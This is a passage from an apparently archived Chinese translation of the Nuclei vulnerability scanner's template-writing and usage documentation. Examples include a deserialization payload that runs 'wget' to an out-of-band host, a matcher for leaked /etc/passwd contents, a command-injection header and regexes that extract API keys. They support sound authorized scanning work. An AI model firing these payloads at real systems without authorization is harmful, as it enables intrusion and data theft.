setheaderargs: part: response # can be request too key: Content-Security-Policy value: \"default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;\"DeleteHeader删除头 DeleteHeader 从请求/响应中删除标头。\naction: deleteheaderargs: part: response # can be request too key: Content-Security-PolicySetBody集合体 SetBody 设置请求/响应的主体。\naction: setbodyargs: part: response # can be request too body: '{\"success\":\"ok\"}'WaitEvent等待事件 WaitEvent 等待事件在页面上触发。\naction: waiteventargs: event: 'Page.loadEventFired'此处列出了支持的事件列表。\n键盘 Keybord 模拟键盘上的单个按键。\naction: keyboardargs: keys: '\\r' # this simulates pressing enter key on keyboardkeys 参数接受键码。\n调试 Debug 在每个 headless 操作之间添加 5 秒的延迟，并显示浏览器中发生的所有 headless 事件的跟踪。\n注意：仅用于调试目的，不要在生产模板中使用它。\naction: debug睡觉 Sleeps 使浏览器等待指定的持续时间（以秒为单位）。这对于调试目的也很有用。\naction: sleepargs: duration: 5选择器 选择器是核无头引擎如何识别执行动作的元素。Nuclei 通过包含各种选项来支持获取选择器 -\n选择器 描述 r / regex 元素匹配 CSS 选择器和文本匹配正则表达式 x / xpath 元素匹配 XPath 选择器 js 从 JS 函数返回元素 search 搜索查询（可以是文本、XPATH、CSS） selector （默认） 元素匹配 CSS 选择器 匹配器/提取器部件 匹配器/提取器part的无头协议支持的有效值是 -\n价值 描述 要求 无头请求 \u003cout_names\u003e 带有存储值的动作名称 原始/身体/数据 来自浏览器的最终 DOM 响应 无头模板示例 下面提供了一个自动登录到 DVWA 的无头模板示例 -\nid: dvwa-headless-automatic-logininfo: name: DVWA Headless Automatic Login author: pdteam severity: highheadless: - steps: - args: url: \"{{BaseURL}}/login.php\" action: navigate - action: waitload - args: by: xpath xpath: /html/body/div/div[2]/form/fieldset/input action: click - action: waitload - args: by: xpath value: admin xpath: /html/body/div/div[2]/form/fieldset/input action: text - args: by: xpath xpath: /html/body/div/div[2]/form/fieldset/input[2] action: click - action: waitload - args: by: xpath value: password xpath: /html/body/div/div[2]/form/fieldset/input[2] action: text - args: by: xpath xpath: /html/body/div/div[2]/form/fieldset/p/input action: click - action: waitload matchers: - part: resp type: word words: - \"You have logged in as\"此处提供了更完整的示例\n网络 网络请求 Nuclei 可以充当可自动化的Netcat，允许用户通过网络发送字节并接收它们，同时提供匹配和提取响应的功能。\n网络请求以指定模板请求开始的网络块开始。\n# Start the requests for the template right herenetwork:输入 请求中的第一件事是输入。输入是将发送到服务器的数据，以及可选的从服务器读取的任何数据。\n最简单的方法是指定一个字符串，它将通过网络套接字发送。\n# inputs is the list of inputs to send to the serverinputs: - data: \"TEST\\r\\n\"您还可以发送将首先解码的十六进制编码文本，并将原始字节发送到服务器。\ninputs: - data: \"50494e47\" type: hex - data: \"\\r\\n\"辅助函数表达式也可以在输入中定义，并且将首先评估然后发送到服务器。最后一个十六进制编码示例可以通过这种方式与辅助函数一起发送 -\ninputs: - data: 'hex_decode(\"50494e47\")\\r\\n'可以使用输入完成的最后一件事是从套接字读取数据。指定read-size一个非零值就可以了。您还可以为读取的数据指定一个名称，以便在该部分进行匹配。\ninputs: - read-size: 8读取多个字节并仅匹配它们的示例。\ninputs: - read-size: 8 name: prefix...matchers: - type: word part: prefix words: - \"CAFEBABE\"多个步骤可以按顺序链接在一起进行网络读/写。\n主持人 请求的下一部分是要连接的主机。动态变量可以放置在路径中以在运行时修改其值。变量以开头{{和结尾，}}并且区分大小写。\n主机名- 变量由命令行上提供的主机名替换。 示例名称值：\nhost: - \"{{Hostname}}\"Nuclei 还可以与目标服务器进行 TLS 连接。只需tls://在主机名前添加前缀即可。\nhost: - \"tls://{{Hostname}}\"如果在主机中指定了端口，则用户提供的端口将被忽略并且模板端口优先。\n匹配器/提取器部件 匹配器/提取器part的网络协议支持的有效值为-\n价值 描述 要求 网络请求 数据 从网络套接字读取的最终数据 原始 / 身体 / 全部 从套接字接收的所有数据 示例网络模板 下面提供了hex用于检测在具有工作匹配器的服务器上运行的 MongoDB的编码输入的最终示例模板文件。\nid: input-expressions-mongodb-detectinfo: name: Input Expression MongoDB Detection author: pd-team severity: info reference: https://github.com/orleven/Tentaclenetwork: - inputs: - data: \"{{hex_decode('3a000000a741000000000000d40700000000000061646d696e2e24636d640000000000ffffffff130000001069736d6173746572000100000000')}}\" host: - \"{{Hostname}}\" read-size: 2048 matchers: - type: word words: - \"logicalSessionTimeout\" - \"localTime\"此处提供了更完整的示例\nDNS DNS 请求 DNS 协议可以轻松地在核心中建模。原子核可以将完全可定制的 DNS 请求发送到名称服务器，并且可以对它们的响应执行匹配/提取。\nDNS 请求以dns块开始，该块指定模板请求的开始。\n# Start the requests for the template right heredns:类型 请求中的第一件事是type。请求类型可以是A , NS , CNAME , SOA , PTR , MX , TXT , AAAA。\n# type is the type for the dns requesttype: A名称 请求的下一部分是要解析的 DNS名称。动态变量可以放置在路径中以在运行时修改其值。变量以开头{{和结尾，}}并且区分大小写。\nFQDN - 变量在运行时由目标的主机名/FQDN 替换。 示例名称值：\nname: {{FQDN}}.com# This value will be replaced on execution with the FQDN.# If FQDN is https://this.is.an.example then the# name will get replaced to the following: this.is.an.example.com截至目前，该工具仅支持每个请求一个名称。\n班级 类类型可以是INET、CSNET、CHAOS、HESIOD、NONE和ANY。通常将其保留为INET就足够了。\n# method is the class for the dns requestclass: inet递归 Recursion 是一个布尔值，它决定解析器是只返回缓存的结果，还是遍历整个 dns 根树以检索新结果。通常最好将其保留为true。\n# Recursion is a boolean determining if the request is recursiverecursion: true重试 Retries 是在不同解析器之间放弃之前重试 dns 查询的尝试次数。推荐一个合理的值，比如3。\n# Retries is a number of retries before giving up on dns resolutionretries: 3匹配器/提取器部件 匹配器/提取器part的DNS协议支持的有效值为-\n价值 描述 request DNS请求 rcode DNS 编码 question DNS 问题消息 extra DNS 消息额外字段 answer DNS 消息应答字段 ns DNS 消息权限字段 raw / all / body 原始 DNS 消息 示例 DNS 模板 用于执行A查询并检查响应中是否有 CNAME 和 A 记录的最终示例模板文件如下：\nid: dummy-cname-ainfo: name: Dummy A dns request author: mzack9999 severity: none description: Checks if CNAME and A record is returned.dns: - name: \"{{FQDN}}\" type: A class: inet recursion: true retries: 3 matchers: - type: word words: # The response must contains a CNAME record - \"IN\\tCNAME\" # and also at least 1 A record - \"IN\\tA\" condition: and此处提供了更完整的示例\n文件 文件请求 Nuclei 允许建模模板也可以在文件系统上匹配/提取。\n# Start of file template blockfile:扩展 要匹配所有扩展名（默认拒绝列表中的扩展名除外），请使用以下命令 -\nextensions: - all您还可以提供应匹配的自定义扩展列表。\nextensions: - py - go还可以提供扩展的拒绝列表。具有这些扩展名的文件将不会被 nuclei 处理。\nextensions: - alldenylist: - go - py - txt默认情况下，某些扩展名被排除在核文件模块中。下面提供了这些列表-\n3g2,3gp,7z,apk,arj,avi,axd,bmp,css,csv,deb,dll,doc,drv,eot,exe,flv,gif,gifv,gz,h264,ico,iso,jar,jpeg,jpg,lock,m4a,m4v,map,mkv,mov,mp3,mp4,mpeg,mpg,msi,ogg,ogm,ogv,otf,pdf,pkg,png,ppt,psd,rar,rm,rpm,svg,swf,sys,tar,tar.gz,tif,tiff,ttf,txt,vob,wav,webm,wmv,woff,woff2,xcf,xls,xlsx,zip更多的选择 可以提供max-size参数来限制核引擎读取的文件的最大大小（以字节为单位）。\n默认max-size值为 5MB (5242880)，大于 的文件max-size将不会被处理。\nno-recursive选项在为核的文件模块处理输入时禁用目录/全局的递归遍历。\n匹配器/提取器 文件协议支持两种类型的匹配器 -\nMatcher 匹配器类型 零件匹配 word 全部 regex 全部 Extractors 提取器类型 零件匹配 word 全部 regex 全部 示例文件模板 下面提供了私钥检测的最终示例模板文件。\nid: google-api-keyinfo: name: Google API Key author: pdteam severity: infofile: - extensions: - all - txt extractors: - type: regex name: google-api-key regex: - \"AIza[0-9A-Za-z\\\\-_]{35}\"# Running file template on http-response/ directorynuclei -t file.yaml -target http-response/# Running file template on output.txtnuclei -t file.yaml -target output.txt此处提供了更完整的示例\n匹配器 匹配器 匹配器允许对协议响应进行不同类型的灵活比较。它们是使 nuclei 如此强大的原因，检查编写非常简单，并且可以根据需要添加多个检查以实现非常有效的扫描。\n类型 一个请求中可以指定多个匹配器。基本上有 6 种匹配器：\n匹配器类型 零件匹配 status 零件的整数比较 size 零件的内容长度 word 协议的一部分 regex 协议的一部分 binary 协议的一部分 dsl 协议的一部分 要匹配响应的状态代码，您可以使用以下语法。\nmatchers: # Match the status codes - type: status # Some status codes we want to match status: - 200 - 302要为十六进制响应匹配二进制，您可以使用以下语法。\nmatchers: - type: binary binary: - \"504B0304\" # zip archive - \"526172211A070100\" # rar RAR archive version 5.0 - \"FD377A585A0000\" # xz tar.xz archive condition: or part: body匹配器还支持将被解码和匹配的十六进制编码数据。\nmatchers: - type: word encoding: hex words: - \"50494e47\" part: body可以根据用户的需要进一步配置Word和Regex匹配器。\ndsl类型的复杂匹配器允许使用辅助函数构建更复杂的表达式。这些功能允许访问包含基于每个协议的各种数据的协议响应。请参阅特定于协议的文档以了解不同的返回结果。\nmatchers: - type: dsl dsl: - \"len(body)\u003c1024 \u0026\u0026 status_code==200\" # Body length less than 1024 and 200 status code - \"contains(toupper(body), md5(cookie))\" # Check if the MD5 sum of cookies is contained in the uppercase body协议响应的每个部分都可以与 DSL 匹配器匹配。一些例子 -\n响应部分 描述 例子 content_length 内容长度标题 content_length \u003e= 1024 status_code 响应状态码 status_code==200 all_headers 包含所有标题的唯一字符串 len(all_headers) body 正文作为字符串 len(body) header_name -转换为小写的标题名称_ len(user_agent) raw 标题 + 响应 len(raw) 状况 可以在单个匹配器中指定多个单词和正则表达式，并且可以使用不同的条件（如AND和**OR ）**进行配置。\nAND - 使用 AND 条件允许匹配匹配器的单词列表中的所有单词。只有当所有单词都匹配时，请求才会被标记为成功。 OR - 使用 OR 条件允许匹配匹配器列表中的单个单词。当匹配器匹配一个单词时，请求将被标记为成功。 配套零件 也可以为请求匹配响应的多个部分，body如果未定义，则默认匹配部分。\n使用 AND 条件的 HTTP 响应正文的示例匹配器：\nmatchers: # Match the body word - type: word # Some words we want to match words: - \"[core]\" - \"[config]\" # Both words must be found in the response body condition: and # We want to match request body (default) part: body同样，可以编写匹配器来匹配您想在响应正文中找到的任何内容，从而允许无限的创造力和可扩展性。\n负匹配器 所有类型的匹配器也支持否定条件，这在您查找具有排除项的匹配时非常有用。这可以通过negative: true在匹配器块中添加来使用。\n这是使用negative条件的示例语法，这将返回PHPSESSID响应标头中没有的所有 URL 。\nmatchers: - type: word words: - \"PHPSESSID\" part: header negative: true多个匹配器 可以在单个模板中使用多个匹配器来通过单个请求对多个条件进行指纹识别。\n这是多个匹配器的语法示例。\nmatchers: - type: word name: php words: - \"X-Powered-By: PHP\" - \"PHPSESSID\" part: header - type: word name: node words: - \"Server: NodeJS\" - \"X-Powered-By: nodejs\" condition: or part: header - type: word name: python words: - \"Python/2.\" - \"Python/3.\" condition: or part: header匹配条件 使用多个匹配器时，默认条件是在所有匹配器之间进行 OR 运算，如果所有匹配器都返回 true，则可以使用 AND 运算来确保返回结果。\nmatchers-condition: and matchers: - type: word words: - \"X-Powered-By: PHP\" - \"PHPSESSID\" condition: or part: header - type: word words: - \"PHP\" part: body提取器 提取器 提取器可用于从模块返回的响应中提取并在结果中显示匹配项。\n类型 一个请求中可以指定多个提取器。截至目前，我们支持两种类型的提取器。\nregex -基于正则表达式从零件中提取数据。 kval - 从协议结果中提取一部分。 使用正则表达式的HTTP 响应正文提取器示例-\n# A list of extractors for text extractionextractors: # type of the extractor. - type: regex # part of the response to extract (can be headers, all too) part: body # regex to use for extraction. regex: - \"(A3T[A-Z0-9]|AKIA|AGPA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}\"甲KVAL提取器为例来提取content-type从HTTP协议响应报头。\n# A list of extractors for text extractionextractors: # type of the extractor - type: kval part: header kval: # header value to extract from response - content-type动态提取器 提取器可用于在编写多请求模板时在运行时捕获动态值。可以在请求中提取和使用 CSRF 令牌、会话头等。\n使用名称定义动态提取器的示例，该提取器api_key将从请求中捕获基于正则表达式的模式。\nextractors: - type: regex name: api_key part: body internal: true regex: - \"(?m)[0-9]{3,10}\\\\.[0-9]+\"这里我们使用提取器名称作为api_key保存提取值的变量，可以在下一个请求的任何部分使用。\n仅 RAW 请求格式支持此功能。\n注意：-internal: true当您只想使用提取器作为动态变量时可以使用，因为这将避免在终端中打印提取的值。\n对于更复杂的匹配，也可以为正则表达式指定可选的正则表达式匹配组。\n# A list of extractors for text extractionextractors: # type of extractor - type: regex # Let's reuse the extracted CSRF token name: csrf_token part: body # group defines the matching group being used. # In GO the \"match\" is the full array of all matches and submatches # match[0] is the full match # match[n] is the submatches. Most often we'd want match[1] as depicted below group: 1 regex: - '\u003cinput\\sname=\"csrf_token\"\\stype=\"hidden\"\\svalue=\"([[:alnum:]]{16})\"\\s/\u003e'上面带有名称的提取器csrf_token将保存提取的值（通过([[:alnum:]]{16}))as abcdefgh12345678.\n如果此正则表达式未提供组选项，则上述具有名称的提取器csrf_html_tag会将完整匹配 (by \u003cinput name=\"csrf_token\"\\stype=\"hidden\"\\svalue=\"([[:alnum:]]{16})\" /\u003e) 保存为\u003cinput name=\"csrf_token\" type=\"hidden\" value=\"abcdefgh12345678\" /\u003e.\n带外测试 自Nuclei v2.3.6发布以来，Nuclei 支持使用interact.sh API 实现基于OOB 的漏洞扫描，内置自动请求关联。就像{{interactsh-url}} 在请求中的任何地方编写，并添加匹配器一样简单interact_protocol。Nuclei 将处理交互与模板的相关性以及通过允许轻松的 OOB 扫描生成的请求。\nInteractsh 占位符 {{interactsh-url}}http和网络请求支持占位符。\n{{interactsh-url}}下面提供了带有占位符的核请求示例。这些在运行时被替换为唯一的 interact.sh URL。\n- raw: - | GET /plugins/servlet/oauth/users/icon-uri?consumerUri=https://{{interactsh-url}} HTTP/1.1 Host: {{Hostname}}交互匹配器 Interactsh 交互可以与word，regex或dsl使用以下部分的匹配器/提取器一起使用。\n部分 interactsh_protocol交互协议 interactsh_request交互请求 interactsh_response 交互响应 交互协议\n值可以是 dns、http 或 smtp。这是每个基于交互的模板的标准匹配器，dns 通常作为通用值，因为它本质上是非常非侵入性的。\n交互请求\ninteract.sh 服务器收到的请求。\n交互响应\ninteract.sh 服务器发送给客户端的响应。\nInteractsh DNS 交互匹配器示例：\nmatchers: - type: word part: interactsh_protocol # Confirms the DNS Interaction words: - \"dns\"交互内容上的 HTTP 交互匹配器 + 词匹配器示例\nmatchers-condition: andmatchers: - type: word part: interactsh_protocol # Confirms the HTTP Interaction words: - \"http\" - type: regex part: interactsh_request # Confirms the retrieval of etc/passwd file regex: - \"root:[x*]:0:0:\"帮助函数 这里是可以用在RAW请求或者网络请求中的帮助函数清单。\nHelper function Description Example len 字符串的长度 len(“Hello”) toupper 字符串转大写 toupper(“Hello”) tolower 字符串转小写 tolower(“Hello”) replace 替换字符串部件 replace(“Hello”, “He”, “Ha”) replace_regex 用正则表达式替换字符串部分 replace_regex(“test”, “regextomach”, “replacewith”) trim 删除尾随的 unicode 字符 trim(“aaaHelloddd”, “ad”) trimleft 从左侧删除 unicode 字符 trimleft(“aaaHelloddd”, “ad”) trimright 从右侧删除 unicode 字符 trimleft(“aaaHelloddd”, “ad”) trimspace 删除尾随空格 trimspace(\" Hello “) trimprefix 修剪指定的前缀 trimprefix(“aaHelloaa”, “aa”) trimsuffix 修剪指定的后缀 trimsuffix(“aaHelloaa”, “aa”) reverse 反转字符串 reverse(“ab”) base64 将字符串编码为 base64 base64(“Hello”) base64_py 像python一样将字符串编码为base64（带有新行） base64_py(“Hello”) base64_decode 从 base64 解码字符串 base64_decode(“SGVsbG8=”) url_encode URL 编码一个字符串 url_encode(“hxxps://projectdiscovery.io/test?a=1”) url_decode URL 解码字符串 url_decode(“https:%2F%2Fprojectdiscovery.io%3Ftest=1”) hex_encode 对字符串进行十六进制编码 hex_encode(“aa”) hex_decode 十六进制解码字符串 hex_decode(“6161”) html_escape HTML 转义字符串 html_escape(“test”) html_unescape HTML 取消转义字符串 html_unescape(\"test”) md5 计算字符串的md5 md5(“Hello”) sha256 计算字符串的sha256 sha256(“Hello”) sha1 计算字符串的sha1 sha1(“Hello”) mmh3 计算字符串的 mmh3 mmh3(“Hello”) contains 验证一个字符串是否包含另一个字符串 contains(“Hello”, “lo”) regex 验证正则表达式与字符串 regex(“H([a-z]+)o”, “Hello”) rand_char 在字符集中选择一个随机字符（可选，默认字母和数字）避免坏字符（可选，默认为空） rand_char(“charset”, “badchars”) rand_char 在字符集中选择一个长度为 l 的随机序列（可选，默认为字母和数字）避免坏字符（可选，默认为空） rand_text_alphanumeric 在字母和数字中选择一个长度为 l 的随机序列，避免坏字符（可选） rand_text_alphanumeric(l, “badchars”) rand_text_alpha 在避免坏字符的字母中选择一个长度为 l 的随机序列 rand_text_alpha(l, “charset”) rand_text_numeric 在避免坏字符的数字中选择一个长度为 l 的随机序列 rand_text_numeric(l, “charset”) rand_int 在最小和最大之间选择一个随机整数 rand_int(min, max) waitfor 阻止逻辑执行 x 秒 waitfor(10) 反序列化辅助函数 Nuclei 允许从ysoserial为一些通用小工具生成有效负载。\n支持的有效载荷：\ndns (URLDNS) commons-collections3.1 commons-collections4.0 jdk7u21 jdk8u20 groovy1 支持的编码：\nbase64 (default) gzip-base64 gzip hex raw 反序列化辅助函数格式：\n{{generate_java_gadget(payload, cmd, encoding}}反序列化辅助函数示例：\n{{generate_java_gadget(\"commons-collections3.1\", \"wget http://{{interactsh-url}}\", \"base64\")}}预处理器 某些预处理器可以在模板中的任何地方全局指定，一旦加载模板就运行，以实现为每个模板运行生成的随机 id 之类的东西。\n随机数 信息\n在每次运行核时为模板生成一个随机 ID。这可以在模板中的任何地方使用，并且始终包含相同的值。randstr可以以数字为后缀，并且也会为这些名称创建新的随机 ID。前任。{{randstr_1}}这将在整个模板中保持不变。\nrandstr 匹配器中也支持，可用于匹配输入。\n例如：-\nrequests: - method: POST path: - \"{{BaseURL}}/level1/application/\" headers: cmd: echo '{{randstr}}' matchers: - type: word words: - '{{randstr}}'工作流程 工作流程 工作流允许用户定义模板的执行顺序。模板将在定义的条件下运行。这些是使用 nuclei 的最有效方式，其中所有模板都根据用户的需要进行配置。这意味着，您可以创建基于技术/基于目标的工作流，例如 Wordpress 工作流、Jira 工作流，它们仅在检测到特定技术时运行。\n如果技术堆栈已知，我们建议您创建自定义工作流程来运行扫描。这导致扫描时间短得多，结果更好。\n工作流可以与被定义workflows的属性，继template/subtemplates和tags执行。\nworkflows: - template: technologies/template-to-execute.yaml工作流类型\n通用工作流 条件工作流 通用工作流 在通用工作流中，可以定义要从单个工作流文件执行的单个或多个模板。它支持文件和目录作为输入。\n在给定 URL 列表上运行所有与配置相关的模板的工作流。\nworkflows: - template: files/git-config.yaml - template: files/svn-config.yaml - template: files/env-file.yaml - template: files/backup-files.yaml - tags: xss,ssrf,cve,lfi运行为您的项目定义的特定检查列表的工作流。\nworkflows: - template: cves/ - template: exposed-tokens/ - template: exposures/ - tags: exposures条件工作流 您还可以创建条件模板，在匹配上一个模板的条件后执行。这对于漏洞检测和利用以及基于技术的检测和利用非常有用。此类工作流的用例广泛而多样。\n基于模板的条件检查\n当基本模板匹配时执行子模板的工作流。\nworkflows: - template: technologies/jira-detect.yaml subtemplates: - tags: jira - template: exploits/jira/基于匹配器名称的条件检查\n在结果中找到基本模板的匹配器时执行子模板的工作流。\nworkflows: - template: technologies/tech-detect.yaml matchers: - name: vbulletin subtemplates: - template: exploits/vbulletin-exp1.yaml - template: exploits/vbulletin-exp2.yaml - name: jboss subtemplates: - template: exploits/jboss-exp1.yaml - template: exploits/jboss-exp2.yaml以类似的方式，您可以根据需要为工作流创建尽可能多的嵌套检查。\n基于子模板和匹配器名称的多级条件检查\n展示模板执行链的工作流，仅当先前的模板匹配时才运行。\nworkflows: - template: technologies/tech-detect.yaml matchers: - name: lotus-domino subtemplates: - template: technologies/lotus-domino-version.yaml subtemplates: - template: cves/xx-yy-zz.yaml subtemplates: - template: cves/xx-xx-xx.yaml条件工作流是以最有效的方式执行检查和漏洞检测的很好例子，而不是将所有模板喷洒在所有目标上，并且通常会在您的时间内获得良好的投资回报率，并且对目标也很温和。\n此处提供了更完整的工作流示例\n模版示例集： https://nuclei.projectdiscovery.io/template-examples\n",
    "description": "",
    "tags": null,
    "title": "漏洞验证工具nuclei官方模版编写中文译文归档",
    "uri": "/%E5%B7%A5%E5%85%B7/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E5%B7%A5%E5%85%B7/nuclei%E5%AE%98%E6%96%B9%E6%A8%A1%E7%89%88%E7%BC%96%E5%86%99%E4%B8%AD%E6%96%87%E5%BD%92%E6%A1%A3/index.html"
  },
  {
    "content": "特性 支持：HTTP | DNS | TCP | FILE support 所有模版都是可以配置的 可大量扫描 基于外带发现 便于编写自定义模版\n安装 go 安装 GO111MODULE=on go get -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei\nmac安装 brew install nuclei\ndocker安装 docker pull projectdiscovery/nuclei:latest\ngithub安装 git clone https://github.com/projectdiscovery/nuclei.git; cd nuclei/v2/cmd/nuclei; go build; mv nuclei /usr/local/bin/; nuclei -version;\n源码安装 https://github.com/projectdiscovery/nuclei/releases\n基本命令 Nuclei is a fast tool for configurable targeted scanning based on templates offering massive extensibility and ease of use. Usage: /Users/xt/Documents/hack/scan/nuclei/nuclei [flags] Flags: -H, -header value Custom Header. -biid, -burp-collaborator-biid string Burp Collaborator BIID -bs, -bulk-size int Maximum Number of hosts analyzed in parallel per template (default 25) -c, -concurrency int Maximum Number of templates executed in parallel (default 10) -config string Nuclei configuration file -de, -disk-export string Directory on disk to export reports in markdown to -debug Debugging request and responses -debug-req Debugging request -debug-resp Debugging response -et, -exclude value Templates to exclude, supports single and multiple templates using directory. -etags, -exclude-tags value Exclude templates with the provided tags -headless Enable headless browser based templates support -impact, -severity value Templates to run based on severity, supports single and multiple severity. -irr, -include-rr Write requests/responses for matches in JSON output -interactions-cache-size int Number of requests to keep in interactions cache (default 5000) -interactions-cooldown-period int Extra time for interaction polling before exiting (default 5) -interactions-eviction int Number of seconds to wait before evicting requests from cache (default 60) -interactions-poll-duration int Number of seconds before each interaction poll request (default 5) -interactsh-url string Interactsh Server URL (default https://interact.sh) -json Write json output to files -l, -list string List of URLs to run templates on -metrics Expose nuclei metrics on a port -metrics-port int Port to expose nuclei metrics on (default 9092) -nc, -no-color Disable colors in output -nt, -new-templates Only run newly added templates -nm, -no-meta Don't display metadata for the matches -no-interactsh Do not use interactsh server for blind interaction polling -o, -output string File to write output to (optional) -page-timeout int Seconds to wait for each page in headless (default 20) -passive Enable Passive HTTP response processing mode -project Use a project folder to avoid sending same request multiple times -project-path string Use a user defined project folder, temporary folder is used if not specified but enabled -proxy-socks-url string URL of the proxy socks server -proxy-url string URL of the proxy server -r, -resolvers string File containing resolver list for nuclei -rl, -rate-limit int Maximum requests to send per second (default 150) -rc, -report-config string Nuclei Reporting Module configuration file -rdb, -report-db string Local Nuclei Reporting Database (Always use this to persistent report data) -retries int Number of times to retry a failed request (default 1) -show-browser Show the browser on the screen -si, -stats-interval int Number of seconds between each stats line (default 5) -silent Show only results in output -spm, -stop-at-first-path Stop processing http requests at first match (this may break template/workflow logic) -stats Display stats of the running scan -system-resolvers Use system dns resolving as error fallback -t, -templates value Templates to run, supports single and multiple templates using directory. -tags value Tags to execute templates for -u, -target string URL to scan with nuclei -tv, -templates-version Shows the installed nuclei-templates version -timeout int Time to wait in seconds before timeout (default 5) -tl List available templates -trace-log string File to write sent requests trace log -ud, -update-directory string Directory storing nuclei-templates (default /Users/xt/nuclei-templates) -ut, -update-templates Download / updates nuclei community templates -v, -verbose Show verbose output -version Show version of nuclei -w, -workflows value Workflows to run for nucleihttps://nuclei.projectdiscovery.io/nuclei/get-started/\n基本用法 有两种方式扫描 1. 模版 (-t/templates) 默认情况下所有的模版（除了nuclei-ignore列）从安装目录中获取默认的模版执行\nnuclei -u https://example.com如果使用大量模版进行扫描或者多个模版地址可以使用下列方式扫描\nnuclei -u https://example.com -t cves/ -t exposures/在针对url列表文件扫描的时候，模版也可以被执行\nnuclei -list http_urls.txt2. workflows (-w/workflows) nuclei -u https://example.com -w workflows/同样的在扫描列表文件的时候也会执行工作流\nnuclei -list http_urls.txt -w workflows/wordpress-workflow.yaml过滤用法 nuclei引擎对改造的模版执行支持3种基本的过滤\nTags (-tags) 基于模板中可用的标签字段进行筛选。 Severity (-severity) 基于模板中可用的安全性字段进行筛选。 Author (-author) 基于模版中作者字段进行过滤 默认情况下，过滤应用在模版加载的路径中，~/nuclei-templates目录并且存在cve标签\nnuclei -u https://example.com -tags cve这个样本将会运行在~/nuclei-templates/exposures/目录中并且存在config标签的所有的模版。\nnuclei -u https://example.com -tags config -t exposures/多重过滤可以和AND指令一起使用，在下面的荔枝中所有的cve标签的仅仅模版或者geeknik作者的高危模版进行扫描。\nnuclei -u https://example.com -tags cve -severity critical,high -author geeknik同样的使用工作流也是一样：\nnuclei -w workflows/wordpress-workflow.yaml -severity critical,high -list http_urls.txt速度限制 nuclei有多种限制速度的因素，包括限制并发数，每个模块同时扫描的主机数，以及每秒发包数。下面是详情的描述。\n标志 描述 rate-limit 控制每秒发包总数，rate-limit有先执行其他两个参数，每秒发包数在最后控制 bulk-size 控制每个模块同时并发扫描的主机数 c 控制同时并发的模块数 通信报文自定义 很多漏洞利用平台或者程序需要你定义HTTP通信，这个可以通过配置配置文件处理：\n$HOME/.config/nuclei/config.yaml 或 CLI flag -H / header例如\n# Headers to include with each request. header: - 'X-BugBounty-Hacker: h1/geekboy' - 'User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) / nuclei'nuclei -header 'User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) / nuclei' -list urls.txt -tags cves模版排除 核支持各种方法来排除/阻止模板执行。默认情况下，nuclei会排除下面列出的标签/模板执行，以避免意外的基于模糊扫描和一些不应该运行的大规模扫描，这些可以很容易通过修改配置文件/标志覆盖。 默认的排除清单有：https://github.com/projectdiscovery/nuclei-templates/blob/master/.nuclei-ignore tags:\n“fuzz” “dos” “misc” nuclei引擎支持两种方式排除扫描： 排除模版（-exclude-templates/exclude） exclude-templates 标志常用来执行单个或者多个模版和目录的过滤。-exclude-templates标志可以被用来提供多种值。\n排除标签（-exclude-tags/etags） exclude-tags 标志用来排除给定的单个或多个模版。\n# 过滤 cves/2020/CVE-2020-XXXX.yaml nuclei -list urls.txt -t cves/ -exclude-templates cves/2020/CVE-2020-XXXX.yaml # 过滤多个模版 nuclei -list urls.txt -exclude-templates exposed-panels/ -exclude-templates technologies/ # 过滤单个标签模版 nuclei -l urls.txt -t cves/ -etags xss # 过滤多个标签模版 nuclei -l urls.txt -t cves/ -etags sqli,rce # 排除标签或模版 nuclei -l urls.txt -include-tags iot,misc,fuzznuclei的配置 默认配置文件地址为：$HOME/.config/nuclei/config.yaml\n# Headers to include with all HTTP request header: - 'X-BugBounty-Hacker: h1/geekboy' # Directory based template execution 模版的目录 templates: - cves/ - vulnerabilities/ - misconfiguration/ # Tags based template execution tags: exposures,cve # Templates Filters 模版过滤 tags: exposures,cve author: geeknik,pikpikcu,dhiyaneshdk severity: critical,high,medium # Template Allowlist 模版允许列 include-tags: dos,fuzz # Tag based inclusion (allows to overwrite nuclei-ignore list) include-templates: # Template based inclusion (allows to overwrite nuclei-ignore list) - vulnerabilities/xxx - misconfiguration/xxxx # Template Denylist 模版停止使用 exclude-tags: info # Tag based exclusion exclude-templates: # Template based exclusion - vulnerabilities/xxx - misconfiguration/xxxx # Rate Limit configuration rate-limit: 500 bulk-size: 50 concurrency: 50自定义模版加载\nnuclei -config project.yaml -list urls.txtnuclei报告-自动同步报告 报告支持github，gitlab，jira整合，这允许nuclei引擎创建自动的票据同步到相关平台相关扫描结果。\n-rc, -report-configgithub report 相关标识可以被用来提供配置文件读取平台细节。如下面是所有支持平台对接的配置文件举例。 https://github.com/projectdiscovery/nuclei/blob/master/v2/cmd/nuclei/issue-tracker-config.yaml 例如，创建一个github的凭证，创建配置文件替换相关配置值即可。\n# Github contains configuration options for GitHub issue tracker github: username: \"$user\" owner: \"$user\" token: \"$token\" project-name: \"testing-project\" issue-label: \"Nuclei\"使用输出报告模式运行nuclei\nnuclei -l urls.txt -t cves/ -rc issue-tracker.yaml同样的，其他平台也可以同样配置。报告模块同样支持基本的过滤和重复检查以避免重复凭证创建。\nallow-list: severity: high,critical这个配置将会确保只定义高危和紧急的安全项输出和检查，```deny-list````用于阻止一些指定的级别的安全项。\n如果你在相同的资产运行周期的任务，你可以考虑-rdb，-report-db标识，本用于在给定目录创建本地副目录用于对问题比较和相关票据存放。\nnuclei -l urls.txt -t cves/ -rc issue-tracker.yaml -rdb prodmarkdown报告扩展 nuclei支持markdown格式扩展，使用-me，-markdown-export标记，这个标记可以将目录作为输入，用来存储markdown格式的报告。\n如果想要包括请求包和相应包的markdown报告，可以使用 -irr，-include-rr标记，这个标记只能在-me参数下使用。\nnuclei -l urls.txt -t cves/ -irr -markdown-export reports扫描统计 nuclei使用-metrics标记时，在执行扫描的时候会在本地开启9092端口，本地访问localhost:9092/metrics，默认端口可以通过-metrics-port标识修改。\n下面是一些例子，当执行nuclei -t cves/ -l urls.txt -metrics的时候，通过下列命令获取扫描统计信息：\ncurl -s localhost:9092/metrics | jq .{ \"duration\": \"0:00:03\", \"errors\": \"2\", \"hosts\": \"1\", \"matched\": \"0\", \"percent\": \"99\", \"requests\": \"350\", \"rps\": \"132\", \"startedAt\": \"2021-03-27T18:02:18.886745+05:30\", 